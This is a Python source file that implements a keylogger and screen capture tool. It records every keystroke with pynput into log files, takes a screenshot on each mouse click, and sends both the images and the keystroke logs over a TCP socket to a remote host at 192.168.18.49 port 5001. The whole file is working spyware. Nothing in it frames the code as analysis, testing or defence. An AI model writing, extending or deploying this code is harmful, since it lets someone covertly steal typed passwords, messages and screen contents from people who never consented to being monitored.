import socket
import tqdm
import os
from os import read, write
from typing import Literal
import pynput
import numpy as np
import cv2
import pyautogui
from pynput.keyboard import Listener as KeyBoardListener
from pynput.keyboard import Key
from pynput.mouse import Listener as MouseListener

imgfilecounter = 1
logfilecounter = 1
imagenamestring = "myimage"
logfilenamestring = "log"
imagefilename = imagenamestring + str(imgfilecounter) + ".png"
logfilename = logfilenamestring + str(logfilecounter) + ".txt"

host = "192.168.18.49"
port = 5001
keys = []
logsofar = False
SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096 # send 4096 bytes each time step

def on_move(x, y):
    pass

def on_scroll(x, y, dx, dy):
    pass

def on_click(x, y, button, pressed):
    global keys, logsofar, logfilecounter, imgfilecounter, imagenamestring, imagefilename, logfilename, logfilenamestring, textfileempty
    if pressed:
        print("Mouse clicked at (", x, ", ", y, ") with ", button)
    else:
        print("Mouse released at (", x, ", ", y, ") with ", button)

        if len(keys) > 0:
            write_file(keys)
            print("Written so far all the keys in log file because the keys list had some values init")
            logsofar = True
            print("As the file contains the keys inserted just a moment ago so the logspfar is true")
        keys = []
        
        image = pyautogui.screenshot()
        image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
        cv2.imwrite(imagefilename, image)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(f"[+] Connecting to {host}:{port}")
        s.connect((host, port))
        print("[+] Connected.")

        filename = imagefilename
        filesize = os.path.getsize(filename)
        # send the filename and filesize
        s.send(f"{filename}{SEPARATOR}{filesize}".encode())

        # start sending the file
        progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(BUFFER_SIZE)        # read the bytes from the file
                if not bytes_read:                      # file transmitting is done
                    break
                s.sendall(bytes_read)                   # we use sendall to assure transimission in busy networks
                progress.update(len(bytes_read))        # update the progress bar
        s.close()
        imgfilecounter += 1
        imagefilename = imagenamestring + str(imgfilecounter) + ".png"

        if logsofar == True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f"[+] Connecting to {host}:{port}")
            s.connect((host, port))
            print("[+] Connected.")

            filename = logfilename
            filesize = os.path.getsize(logfilename)
            s.send(f"{filename}{SEPARATOR}{filesize}".encode())     # send the filename and filesize

            # start sending the file    
            progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
            with open(filename, "rb") as f:
                while True:
                    bytes_read = f.read(BUFFER_SIZE)        # read the bytes from the file
                    if not bytes_read:                      # file transmitting is done
                        break
                    s.sendall(bytes_read)                   # we use sendall to assure transimission in busy networks
                    progress.update(len(bytes_read))        # update the progress bar
            s.close()
            logsofar = False
            print("As all the keystrokes are sent so set the logsofar = False")
            logfilecounter += 1
            logfilename = logfilenamestring + str(logfilecounter) + ".txt"
        else:
            print("As the log contains no records so did not sent a log file")

def on_press(key):
    global keys, count, logsofar
    keys.append(key)
    print(key, " appeneded in keys")
    if len(keys) >= 20:
        print("As the length of keys is now >= 20 so about to write in file and clear keys")
        write_file(keys)
        keys = []
        print("As the file contains the keys inserted just a moment ago so the logspfar is true")
        logsofar = True

    if str(key).find("esc") > 0:
        if len(keys) > 0:
            write_file(keys)
            print("The user has pressed esc and currenyly there are keys stored so wrote those in file")
            logsofar = True
            print("As the file contains the keys inserted just a moment ago so the logspfar is true")
        keys = []

def on_release(key):
    if key == Key.esc:
        return False

def write_file(keys):
    global filecounter, logfilenamestring, logfilename

    with open(logfilename, "w") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("<Space>")
            elif k.find("backspace") > 0:
                f.write("<BACKSPACE>")
            elif k.find("tab") > 0:
                f.write("<TAB>")
            elif k.find("caps") > 0:
                f.write("<CAPS_LOCK>")
            elif k.find("enter") > 0:
                f.write("\n")
            elif k.find("up") > 0:
                f.write("<Up arrow key>")
            elif k.find("down") > 0:
                f.write("<Down arrow key>")
            elif k.find("left") > 0:
                f.write("<left arrow key>")
            elif k.find("right") > 0:
                f.write("<Right arrow key>")
            elif k.find("esc") > 0:
                f.write("<ESC>")
            elif k.find("Key") == -1:
                f.write(k)

keyboard_listener = KeyBoardListener(on_press=on_press, on_release=on_release)
mouse_listener = MouseListener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)

keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()
mouse_listener.join()